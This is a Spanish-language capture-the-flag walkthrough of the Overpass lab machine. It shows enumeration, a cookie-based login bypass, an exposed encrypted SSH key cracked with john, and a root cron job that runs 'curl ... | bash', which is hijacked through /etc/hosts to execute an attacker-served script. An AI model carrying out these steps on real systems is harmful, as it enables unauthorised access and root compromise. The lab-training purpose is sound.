@@ -1,1 +1,331 @@
 # overpass walkthrough
+//Los cambios de ip en este walkthrough se deben a que he hecho la máquina en varios días.
+
+Comienzo con un escaneo para ver los servicios.
+
+sudo nmap -p- 10.128.135.66
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-06-22 12:38 CEST
+Nmap scan report for 10.128.135.66
+Host is up (0.028s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 9.83 seconds
+
+Vale, tenemos web y ssh.
+
+Voy a ver la web. Es una página de un gestor de contraseñas, a primera visto no hay mucho. 
+
+Sigo con la enumeración.
+
+sudo dirsearch -u http://10.128.135.66/ --exclude-sizes=0B
+/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
+  from pkg_resources import DistributionNotFound, VersionConflict
+
+  _|. _ _  _  _  _ _|_    v0.4.3
+ (_||| _) (/_(_|| (_| )
+
+Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460
+
+Output File: /home/mksk/reports/http_10.128.135.66/__26-06-22_12-42-54.txt
+
+Target: http://10.128.135.66/
+
+[12:42:54] Starting: 
+[12:42:56] 200 -  782B  - /404.html
+[12:42:58] 301 -   42B  - /admin  ->  /admin/
+[12:42:58] 200 -    1KB - /admin.html
+[12:42:58] 200 -    1KB - /admin/
+[12:43:04] 200 -    2KB - /downloads/
+[12:43:08] 200 -    2KB - /login.js
+[12:43:09] 200 -   28B  - /main.js
+
+He encontrado admin.html y login.js.
+
+Aqui tengo el código de admin.html.
+
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>Overpass</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" type="text/css" media="screen" href="/css/main.css">
+    <link rel="stylesheet" type="text/css" media="screen" href="/css/login.css">
+    <link rel="icon" type="image/png" href="/img/overpass.png" />
+    <script src="/main.js"></script>
+    <script src="/login.js"></script>
+    <script src="/cookie.js"></script>
+</head>
+
+<body onload="onLoad()">
+    <nav>
+        <img class="logo" src="/img/overpass.svg" alt="Overpass logo">
+        <h2 class="navTitle"><a href="/">Overpass</a></h2>
+        <a class="current" href="/aboutus">About Us</a>
+        <a href="/downloads">Downloads</a>
+    </nav>
+    <div class="content">
+        <h1>Administrator area</h1>
+        <p>Please log in to access this content</p>
+        <div>
+            <h3 class="formTitle">Overpass administrator login</h1>
+        </div>
+        <form id="loginForm">
+            <div class="formElem"><label for="username">Username:</label><input id="username" name="username" required></div>
+            <div class="formElem"><label for="password">Password:</label><input id="password" name="password"
+                    type="password" required></div>
+            <button>Login</button>
+        </form>
+        <div id="loginStatus"></div>
+    </div>
+</body>
+
+</html>
+
+Y aqui el de login.js.
+
+async function postData(url = '', data = {}) {
+    // Default options are marked with *
+    const response = await fetch(url, {
+        method: 'POST', // *GET, POST, PUT, DELETE, etc.
+        cache: 'no-cache', // *default, no-cache, reload, force-cache, only-if-cached
+        credentials: 'same-origin', // include, *same-origin, omit
+        headers: {
+            'Content-Type': 'application/x-www-form-urlencoded'
+        },
+        redirect: 'follow', // manual, *follow, error
+        referrerPolicy: 'no-referrer', // no-referrer, *client
+        body: encodeFormData(data) // body data type must match "Content-Type" header
+    });
+    return response; // We don't always want JSON back
+}
+const encodeFormData = (data) => {
+    return Object.keys(data)
+        .map(key => encodeURIComponent(key) + '=' + encodeURIComponent(data[key]))
+        .join('&');
+}
+function onLoad() {
+    document.querySelector("#loginForm").addEventListener("submit", function (event) {
+        //on pressing enter
+        event.preventDefault()
+        login()
+    });
+}
+async function login() {
+    const usernameBox = document.querySelector("#username");
+    const passwordBox = document.querySelector("#password");
+    const loginStatus = document.querySelector("#loginStatus");
+    loginStatus.textContent = ""
+    const creds = { username: usernameBox.value, password: passwordBox.value }
+    const response = await postData("/api/login", creds)
+    const statusOrCookie = await response.text()
+    if (statusOrCookie === "Incorrect credentials") {
+        loginStatus.textContent = "Incorrect Credentials"
+        passwordBox.value=""
+    } else {
+        Cookies.set("SessionToken",statusOrCookie)
+        window.location = "/admin"
+    }
+}
+
+He probado un par de cosas, sin éxito. 
+He leído la pista de la flag de user. "OWASP Top 10 Vuln! Do NOT bruteforce."
+
+Mirando y probando vulnerabilidades del OWASP Top 10 he llegado a lo siguiente.
+
+Intentando saltarme la autenticación. He probado el siguiente payload para hacer un bypass a la autenticación. 
+Cookies.set("SessionToken", "")
+He cargado la página otra vez, y me he encontrado una clave ssh.
+
+-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: AES-128-CBC,9F85D92F34F42626F13A7493AB48F337
+
+LNu5wQBBz7pKZ3cc4TWlxIUuD/opJi1DVpPa06pwiHHhe8Zjw3/v+xnmtS3O+qiN
+JHnLS8oUVR6Smosw4pqLGcP3AwKvrzDWtw2ycO7mNdNszwLp3uto7ENdTIbzvJal
+73/eUN9kYF0ua9rZC6mwoI2iG6sdlNL4ZqsYY7rrvDxeCZJkgzQGzkB9wKgw1ljT
+WDyy8qncljugOIf8QrHoo30Gv+dAMfipTSR43FGBZ/Hha4jDykUXP0PvuFyTbVdv
+BMXmr3xuKkB6I6k/jLjqWcLrhPWS0qRJ718G/u8cqYX3oJmM0Oo3jgoXYXxewGSZ
+AL5bLQFhZJNGoZ+N5nHOll1OBl1tmsUIRwYK7wT/9kvUiL3rhkBURhVIbj2qiHxR
+3KwmS4Dm4AOtoPTIAmVyaKmCWopf6le1+wzZ/UprNCAgeGTlZKX/joruW7ZJuAUf
+ABbRLLwFVPMgahrBp6vRfNECSxztbFmXPoVwvWRQ98Z+p8MiOoReb7Jfusy6GvZk
+VfW2gpmkAr8yDQynUukoWexPeDHWiSlg1kRJKrQP7GCupvW/r/Yc1RmNTfzT5eeR
+OkUOTMqmd3Lj07yELyavlBHrz5FJvzPM3rimRwEsl8GH111D4L5rAKVcusdFcg8P
+9BQukWbzVZHbaQtAGVGy0FKJv1WhA+pjTLqwU+c15WF7ENb3Dm5qdUoSSlPzRjze
+eaPG5O4U9Fq0ZaYPkMlyJCzRVp43De4KKkyO5FQ+xSxce3FW0b63+8REgYirOGcZ
+4TBApY+uz34JXe8jElhrKV9xw/7zG2LokKMnljG2YFIApr99nZFVZs1XOFCCkcM8
+GFheoT4yFwrXhU1fjQjW/cR0kbhOv7RfV5x7L36x3ZuCfBdlWkt/h2M5nowjcbYn
+exxOuOdqdazTjrXOyRNyOtYF9WPLhLRHapBAkXzvNSOERB3TJca8ydbKsyasdCGy
+AIPX52bioBlDhg8DmPApR1C1zRYwT1LEFKt7KKAaogbw3G5raSzB54MQpX6WL+wk
+6p7/wOX6WMo1MlkF95M3C7dxPFEspLHfpBxf2qys9MqBsd0rLkXoYR6gpbGbAW58
+dPm51MekHD+WeP8oTYGI4PVCS/WF+U90Gty0UmgyI9qfxMVIu1BcmJhzh8gdtT0i
+n0Lz5pKY+rLxdUaAA9KVwFsdiXnXjHEE1UwnDqqrvgBuvX6Nux+hfgXi9Bsy68qT
+8HiUKTEsukcv/IYHK1s+Uw/H5AWtJsFmWQs3bw+Y4iw+YLZomXA4E7yxPXyfWm4K
+4FMg3ng0e4/7HRYJSaXLQOKeNwcf/LW5dipO7DmBjVLsC8eyJ8ujeutP/GcA5l6z
+ylqilOgj4+yiS813kNTjCJOwKRsXg2jKbnRa8b7dSRz7aDZVLpJnEy9bhn6a7WtS
+49TxToi53ZB14+ougkL4svJyYYIRuQjrUmierXAdmbYF9wimhmLfelrMcofOHRW2
++hL1kHlTtJZU8Zj2Y2Y3hd6yRNJcIgCDrmLbn9C5M0d7g0h2BlFaJIZOYDS6J6Yk
+2cWk/Mln7+OhAApAvDBKVM7/LGR9/sVPceEos6HTfBXbmsiV+eoFzUtujtymv8U7
+-----END RSA PRIVATE KEY-----
+
+Encriptada, la paso por ssh2john. 
+
+ssh2john id_rsa > hash.txt
+
+john-the-ripper --wordlist=/home/mksk/wordlists/rockyou.txt hash.txt 
+Warning: detected hash type "SSH", but the string is also recognized as "ssh-opencl"
+Use the "--format=ssh-opencl" option to force loading these as that type instead
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 3DES/AES 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
+Cost 2 (iteration count) is 1 for all loaded hashes
+Will run 16 OpenMP threads
+Note: Passwords longer than 10 [worst case UTF-8] to 32 [ASCII] rejected
+Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
+james13          (id_rsa)     
+1g 0:00:00:00 DONE (2026-06-22 13:00) 20.00g/s 268800p/s 268800c/s 268800C/s 100588..vonnie
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+
+Vale, ya tengo la password de la clave. Ahora me hace falta el usuario.
+Al mirar la página en la que está la clave ssh veo lo siguiente.
+Since you keep forgetting your password, James, I've set up SSH keys for you.
+
+If you forget the password for this, crack it yourself. I'm tired of fixing stuff for you.
+Also, we really need to talk about this "Military Grade" encryption. - Paradox
+
+Ya tengo un user.
+
+La máquina ha dejado de responder a todo, ni ssh ni ping ni nada. La reinicio.
+
+
+ssh james@10.128.130.76 -i /home/mksk/.ssh/id_rsa 
+Enter passphrase for key '/home/mksk/.ssh/id_rsa': 
+Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-139-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+ System information as of Wed Oct 22 21:28:38 UTC 2025
+
+  System load:  0.36               Processes:             109
+  Usage of /:   36.2% of 18.53GB   Users logged in:       0
+  Memory usage: 4%                 IPv4 address for ens5: 10.10.167.7
+  Swap usage:   0%
+
+
+Expanded Security Maintenance for Infrastructure is not enabled.
+
+0 updates can be applied immediately.
+
+58 additional security updates can be applied with ESM Infra.
+Learn more about enabling ESM Infra service for Ubuntu 20.04 at
+https://ubuntu.com/20-04
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Your Hardware Enablement Stack (HWE) is supported until April 2025.
+
+Last login: Sat Jun 27 04:45:40 2020 from 192.168.170.1
+james@ip-10-128-130-76:~$ 
+
+Consigo acceso por ssh.
+
+La primera flag está en el escritorio del usuario.
+
+james@ip-10-128-130-76:~$ ls -la
+total 48
+drwxr-xr-x 6 james james 4096 Jun 27  2020 .
+drwxr-xr-x 5 root  root  4096 Jun 22 11:10 ..
+lrwxrwxrwx 1 james james    9 Jun 27  2020 .bash_history -> /dev/null
+-rw-r--r-- 1 james james  220 Jun 27  2020 .bash_logout
+-rw-r--r-- 1 james james 3771 Jun 27  2020 .bashrc
+drwx------ 2 james james 4096 Jun 27  2020 .cache
+drwx------ 3 james james 4096 Jun 27  2020 .gnupg
+drwxrwxr-x 3 james james 4096 Jun 27  2020 .local
+-rw-r--r-- 1 james james   49 Jun 27  2020 .overpass
+-rw-r--r-- 1 james james  807 Jun 27  2020 .profile
+drwx------ 2 james james 4096 Jun 27  2020 .ssh
+-rw-rw-r-- 1 james james  438 Jun 27  2020 todo.txt
+-rw-rw-r-- 1 james james   38 Jun 27  2020 user.txt
+
+james@ip-10-128-130-76:~$ cat user.txt 
+thm{65c******************6bf7}
+
+Ahora queda escalar privilegios. Veo cual es el otro archivo que hay en el directorio james.
+
+james@ip-10-128-130-76:~$ cat todo.txt 
+To Do:
+> Update Overpass' Encryption, Muirland has been complaining that it's not strong enough
+> Write down my password somewhere on a sticky note so that I don't forget it.
+  Wait, we make a password manager. Why don't I just use that?
+> Test Overpass for macOS, it builds fine but I'm not sure it actually works
+> Ask Paradox how he got the automated build script working and where the builds go.
+  They're not updating on the website
+
+
+Me ha llamado la atención el archivo .overpass.
+
+james@ip-10-128-130-76:~$ cat .overpass 
+,LQ?2>6QiQ$JDE6>Q[QA2DDQiQD2J5C2H?=J:?8A:4EFC6QN.
+
+Esta encriptado. Le pregunto a deepseek el tipo de encriptación mientras pruebo cosas en cibercheff. Ha sacado ROT47.
+
+.overpass contiene lo siguiente.
+[{"name":"System","pass":"saydrawnlyingpicture"}]. 
+
+Bueno, vuelvo a todo.txt. Busco el script automatizado.
+
+james@ip-10-128-130-76:~$ cat /etc/crontab
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user	command
+17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
+25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+# Update builds from latest code
+* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
+
+Aquí está.
+Ejecuta un script de la web como root.
+
+GOOS=linux /usr/local/go/bin/go build -o ~/builds/overpassLinux ~/src/overpass.go
+## GOOS=windows /usr/local/go/bin/go build -o ~/builds/overpassWindows.exe ~/src/overpass.go
+## GOOS=darwin /usr/local/go/bin/go build -o ~/builds/overpassMacOS ~/src/overpass.go
+## GOOS=freebsd /usr/local/go/bin/go build -o ~/builds/overpassFreeBSD ~/src/overpass.go
+## GOOS=openbsd /usr/local/go/bin/go build -o ~/builds/overpassOpenBSD ~/src/overpass.go
+echo "$(date -R) Builds completed" >> /root/buildStatus
+
+
+Buscando maneras de usar esto para escalar privilegios me doy cuenta de que puedo modificar el archivo /etc/hosts.
+
+Dado que el script se lo descarga de overpass.thm, modifico la siguiente linea para que sea mi máquina.
+192.168.131.65 overpass.thm
+
+* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
+
+Ahora me creo el directorio y el script para que ejecute el servidor.
+
+~/downloads/src$ pwd
+/home/mksk/downloads/src
+
+Y creo el script.
+
+nano buildscript.sh
+cat /root/root.txt > /home/james/flag2.txt
+
